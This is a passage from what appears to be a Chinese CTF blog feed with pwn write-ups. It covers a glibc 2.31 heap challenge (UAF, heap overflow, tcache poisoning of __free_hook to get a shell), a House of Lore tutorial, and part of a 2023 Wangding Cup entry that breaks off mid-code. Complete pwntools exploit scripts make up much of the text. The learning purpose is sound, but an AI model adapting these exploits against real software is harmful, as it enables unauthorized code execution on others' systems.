mode:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter X:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter a string: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input filename&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400EFB&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;output.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Do you want to write data?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;info&gt;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;&gt;:\x60\x21\x21&#x27;</span>+<span class="string">b&#x27;&gt;@a*&#x27;</span>+<span class="string">b&#x27;&gt;~3&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4010AE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>+<span class="number">0x100</span>)+p64(<span class="number">0x602121</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401457&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>贵阳大数据及网络安全精英对抗赛</title>
      <link href="/2023/05/02/%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9B/"/>
      <url>/2023/05/02/%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>就搞到一题附件 做了下发现对于只能操控单个chunk的利用手法不够熟练 于是用博客记录一下思路</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021148107.png" title="image-20230502114845031" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021148107.png" alt="image-20230502114845031"></a></p><p>libc版本是2.31 保护机制中规中矩 反正是个堆 都大差不差</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( v1 != ptr )</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Create Complete!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add函数 只能操控一个chunk 不过这里的检查有漏洞 如果已经有一个chunk了 跳过的只是malloc的部分 输入data和size的并不受限 所以这里存在一个堆溢出漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">int</span>)ptr;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Delete Complete&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数 明显存在一个UAF漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">int</span>)ptr;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;Your Note: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)ptr);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show函数 调用printf打印堆块内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;zero note!&quot;</span>);</span><br><span class="line">  v1 = ptr;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;NewData: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit Complete!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit函数 用来编辑堆块内容</p><p>那么总结下来 就是只能同时控制一个chunk 但是可以利用的漏洞都给了 这种情况下 我想到的是通过填满tcachebin的链表 从而申请到fastbin chunk 随后利用malloc_consolidate来把fastbin chunk放入到smallbin中 从而利用UAF泄露libc基址</p><p>还有一种办法是学习enllus1on师傅的  利用堆溢出覆盖top chunk的size 从而再次申请一个大chunk 于是就会重新分配一个top chunk 并且把原来的释放到unsortedbin中 这样也可以泄露libc基址</p><p>下面两种办法都演示一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(cyclic(<span class="number">0x10</span>))</span><br><span class="line">    delete()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">bigchunk()</span><br></pre></td></tr></table></figure><p>这里来实现double free的原理是因为tcache高版本新加入的key 位于bk域 只要覆盖key 就可以绕过double free检测</p><p>此时我们成功把fastbin中的chunk释放进入smallbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021203851.png" title="image-20230502120334818" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021203851.png" alt="image-20230502120334818"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete()</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1</span>-<span class="number">0x1ebc30</span></span><br><span class="line">success(<span class="string">&quot;libc_addrr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>随后就是重新申请这块空间 注意一下覆盖末位的值 需要减去 这样就成功获取到了libc基址</p><p>还有一种办法 先利用堆溢出覆盖top chunk的size 注意这个size要使得top chunk起始地址+size刚好到一个页的起始</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xd51</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload), payload)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021207532.png" title="image-20230502120735504" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021207532.png" alt="image-20230502120735504"></a></p><p>此时申请一个比top chunk大的chunk top chunk就会被释放进入unsortedbin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021214299.png" title="image-20230502121414272" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021214299.png" alt="image-20230502121414272"></a></p><p>那么我们从unsortedbin中申请出来一个chunk 就可以泄露出libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span>-<span class="number">0x551</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br></pre></td></tr></table></figure><p>接下来就是如何实现任意写了 由于只能控制一个chunk 所以哪怕我们有double free 也没有办法申请出来任意地址的chunk 所以我们需要把size域更改 使得chunk被重新释放时进入其他链表 从而使得原来的链表保留任意写的地址 听不懂没有关系 接下来来详解一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure><p>首先 利用老办法来构造一个double free的链表</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021224805.png" title="image-20230502122436781" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021224805.png" alt="image-20230502122436781"></a></p><p>此时 tcachebin中有两个链表  并且二者是物理相邻的 我们先申请出低地址处的0x20的链表  为了堆溢出覆盖到下一个chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x51</span>)+p64(free_hook-<span class="number">0x8</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021225422.png" title="image-20230502122545391" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021225422.png" alt="image-20230502122545391"></a></p><p>可以看到此时size域被修改了  并且链表中写入了我们的目标地址 之所以要减去8 是因为只能控制一个chunk 如果我们想要采用覆盖free_hook的办法来获取shell 那么被释放的chunk首地址一定要为&#x2F;bin&#x2F;sh或者其他能够getshell的参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021227497.png" title="image-20230502122727466" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305021227497.png" alt="image-20230502122727466"></a></p><p>此时把0x30的链表中申请出来 那么此时供我们控制的chunk指针也就是0x55e70eeee2b0这个 如果我们再次释放chunk呢</p><p>此时就会把这个chunk释放到0x50的链表中 和我们0x30链表中任意写的地址错位开 那么此时再次申请0x20大小的chunk 就可以达到任意写的目的了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;59.110.164.72&quot;,10001)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;NewData: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bigchunk</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment"># add(0x30,b&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment"># delete()</span></span><br><span class="line"><span class="comment"># for i in range(7):</span></span><br><span class="line"><span class="comment">#     edit(cyclic(0x10))</span></span><br><span class="line"><span class="comment">#     delete()</span></span><br><span class="line"><span class="comment"># add(0x80,b&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment"># bigchunk()</span></span><br><span class="line"><span class="comment"># delete()</span></span><br><span class="line"><span class="comment"># add(0x30,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># show()</span></span><br><span class="line"><span class="comment"># libc_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))-1-0x1ebc30</span></span><br><span class="line"><span class="comment"># success(&quot;libc_addrr :&quot;+hex(libc_addr))</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xd51</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload), payload)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span>-<span class="number">0x551</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x51</span>)+p64(free_hook-<span class="number">0x8</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">delete()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house of lore</title>
      <link href="/2023/04/27/house-of-lore/"/>
      <url>/2023/04/27/house-of-lore/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一种基于smallbin的任意写的攻击手法 不过要求非常高 需要先修改ptr_addr处 以此来绕过检查  所以我感觉是非常鸡肋的一种手法 不过还是记录一下</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这段源码调用是在申请smallbin中的free chunk时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure><p>这两句的作用在于获取smallbin的指针 idx的值为5 bin_at函数依据idx来搜寻对应的chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292057177.png" title="image-20230429205741099" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292057177.png" alt="image-20230429205741099"></a></p><p>last (bin)实际上是一个宏定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>如果其与bin本身相等 则无法进入判断 wiki上的解释是说明此时链表为空 但是我测试如果利用malloc_consolidate来把fastbin放入smallbin 貌似也过不了判断</p><p>过了if后  还会进行一次判断 此时是判断small bin有没有进行初始化 如果初始化了就进入第二个分支</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果绕过这个判断就是实现本次攻击手法的关键</p><p>对于bck-&gt;fd指向的地址做了检测 而bck是通过这条赋值的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br></pre></td></tr></table></figure><p>也就是说我们要构造成下面这样</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292155929.png" title="image-20230429215526887" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292155929.png" alt="image-20230429215526887"></a></p><p>之所以还要一个fake chunk2 是因为 如果只有fake chunk1 那么我们通过的是将attack_chunk从smallbin中申请出来的那次判断  此时plmalloc误判把fake chunk接到了 smallbin的倒数第二个 下次再次申请合适大小的chunk 就会申请到fake chunk</p><p>而要把fake chunk申请出来的话 就得再进行一次判断 也就用到了fake chunk2 不过这一点倒不是很需要担心 这需要对fake chunk的地址延申几个字长出来 用来充当fake chunk2就可以了</p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><p><strong>演示程序: 由我自己编写 包含UAF 堆溢出等漏洞</strong></p><p><strong>演示环境: ubuntu20 替换libc为libc2.23</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_chunk1 = elf.bss(<span class="number">0x500</span>)</span><br><span class="line">fake_chunk2 = elf.bss(<span class="number">0x700</span>)</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x110</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>首先需要泄露堆地址 以便我们进行fake chunk的构造</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292207146.png" title="image-20230429220705115" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292207146.png" alt="image-20230429220705115"></a></p><p>随后进行fakechunk1和fakechunk2的构造 为了省事我程序自带了一个任意写的函数  具体题目的话 需要自己根据情况来构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(fake_chunk1)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">chunk_addr = heap_addr</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(chunk_addr)+p64(fake_chunk2)</span><br><span class="line">write_somewhere(fake_chunk1,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(fake_chunk1)</span><br><span class="line">write_somewhere(fake_chunk2,payload)</span><br></pre></td></tr></table></figure><p>随后就是申请两个和smallbin chunk同样大小的chunk 第二个就会申请到fake chunk1的位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292210966.png" title="image-20230429221039938" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304292210966.png" alt="image-20230429221039938"></a></p><p>同时你可以注意到 fake chunk1和fake chunk2其实就隔一点字长就行 我上面还给空了0x100字节 其实就利用同一次任意写输入即可</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我是对这个办法不太报希望  因为利用难度比较高 需要前提就具备一个已知地址任意写的漏洞  少数题目可能会提供 或者需要跟其他链配合利用 属于是单个存在没有什么用的链吧 我感觉 以后可能会打脸</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023网鼎杯</title>
      <link href="/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数</p><p>下面的顺序被我打乱了 因为附件也是学长发的  所以凑合着做吧</p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png" title="image-20230420115201871" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png" alt="image-20230420115201871"></a></p><p>32位 保护机制基本上全关了</p><p>解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __usercall __noreturn <span class="title function_">start</span><span class="params">(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-4h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span 